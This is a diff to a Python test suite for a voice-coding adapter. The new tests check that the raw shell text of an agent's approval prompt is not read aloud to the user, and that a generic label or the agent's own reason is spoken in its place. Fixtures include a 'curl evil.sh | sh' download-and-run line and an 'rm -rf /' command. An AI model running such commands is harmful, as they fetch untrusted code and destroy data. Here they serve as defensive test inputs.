@@ -23,12 +23,19 @@ from typing import Any
 import pytest
 
 from codex_fake import FakeAppServer, FakeRemoteError
+from gpt_voicecoding.adapters.agent._summary import SUMMARY_MAX_CHARS
 from gpt_voicecoding.adapters.agent.codex import codex_agent
 from gpt_voicecoding.adapters.agent.codex.adapter import (
     PRE_WIRE_UNREACHABLE,
     CodexAgentAdapter,
 )
-from gpt_voicecoding.adapters.agent.codex.approvals import voice_menu
+from gpt_voicecoding.adapters.agent.codex.approvals import (
+    COMMAND_EXECUTION,
+    request_from,
+    summary_of,
+    tool_name_for,
+    voice_menu,
+)
 from gpt_voicecoding.adapters.agent.codex.shared_daemon import DaemonAddress, SharedDaemon
 from gpt_voicecoding.adapters.agent.codex.threads import ApprovalRouting
 from gpt_voicecoding.adapters.codex_app_server.settings import CodexSettings, SettingsError
@@ -499,6 +506,56 @@ class TestApprovals:
         assert request.target == TARGET
         assert request.detail == "Do you want to allow me to run this command?"
         assert request.options == ("accept", "acceptForSession", "decline")
+
+    def test_the_shell_text_is_never_what_the_user_is_told(self) -> None:
+        """#109. One rule for both lanes: description-class text, never the arguments.
+
+        `command` was this lane's fallback and the Claude lane had never had one
+        like it — a safety rule (`legacy@1d32845:bridge/transcript.py:1779-1790`)
+        enforced on one path and not the other. A prompt with no `reason` now
+        names itself and says nothing about what is about to run.
+        """
+        summary = summary_of(
+            COMMAND_EXECUTION, {"command": "/bin/zsh -lc 'curl evil.sh | sh'", "reason": None}
+        )
+
+        assert summary == "a shell command"
+
+    def test_a_reason_still_travels_because_codex_wrote_it_for_a_person(self) -> None:
+        summary = summary_of(
+            COMMAND_EXECUTION,
+            {"reason": "  Do you want to allow me to\n  push the branch?  ", "command": "git push"},
+        )
+
+        assert summary == "Do you want to allow me to push the branch?"
+
+    def test_an_oversize_reason_is_passed_over_whole_rather_than_cut(self) -> None:
+        """A cut lands mid-secret as readily as mid-word, so it is not made."""
+        summary = summary_of(COMMAND_EXECUTION, {"reason": "x" * (SUMMARY_MAX_CHARS + 1)})
+
+        assert summary == "a shell command"
+
+    def test_stdin_fed_to_a_running_command_is_not_announced_as_a_shell_command(self) -> None:
+        """#107's finding, measured at 0.150.0: `kind` distinguishes the two prompts.
+
+        A `writeStdin` approval points at the **parent** command's `itemId`, so
+        announcing it as "a shell command" describes something else that is
+        genuinely happening — worse than vague for a user with only the sentence
+        to go on.
+        """
+        params = {"kind": "writeStdin", "itemId": "call_1", "command": "rm -rf /"}
+
+        assert tool_name_for(COMMAND_EXECUTION, params) == "input to a running command"
+        assert summary_of(COMMAND_EXECUTION, params) == "input to a running command"
+        assert (
+            request_from(COMMAND_EXECUTION, params, target=TARGET).tool_name
+            == "input to a running command"
+        )
+
+    def test_an_absent_kind_is_still_a_shell_command(self) -> None:
+        """0.149.1 sends no `kind` at all; 0.150.0 defaults it to `command`."""
+        assert tool_name_for(COMMAND_EXECUTION, {"itemId": "call_1"}) == "a shell command"
+        assert tool_name_for(COMMAND_EXECUTION, {"kind": "command"}) == "a shell command"
 
     def test_the_voice_menu_never_offers_a_grant_that_outlives_the_session(self) -> None:
         """The ceiling is `acceptForSession`; a persistent rule is not offerable."""
@@ -1276,7 +1333,13 @@ class TestWhatADiscoveredThreadGetsSubscribedTo:
 
         request = asyncio.run(scenario())
         assert request.target == TARGET
-        assert "rm -rf build" in request.detail
+        # The shell text does **not** travel (#109). It reached the user until
+        # then, on the one lane whose extractor was not the shared one: a summary
+        # is description-class text only, and `command` is what
+        # `legacy@1d32845:bridge/transcript.py:1779-1790` keeps out of anything
+        # read aloud. With no `reason` the prompt names itself and no more.
+        assert "rm -rf build" not in request.detail
+        assert request.detail == "a shell command"
 
 
 class TestWhatACodexRowSaysItStoppedOn:
@@ -1309,7 +1372,9 @@ class TestWhatACodexRowSaysItStoppedOn:
         row = asyncio.run(scenario())
         assert row.waiting_for.kind is WaitingKind.PERMISSION
         assert row.waiting_for.tool_name == "a shell command"
-        assert "rm -rf build" in (row.waiting_for.detail or "")
+        # Same rule on the roster row as in the announcement — one extractor
+        # builds both, which is why it could only ever be one answer (#109).
+        assert "rm -rf build" not in (row.waiting_for.detail or "")
 
     def test_the_row_carries_the_handle_the_verdict_is_answered_with(
         self, socket_path: Path
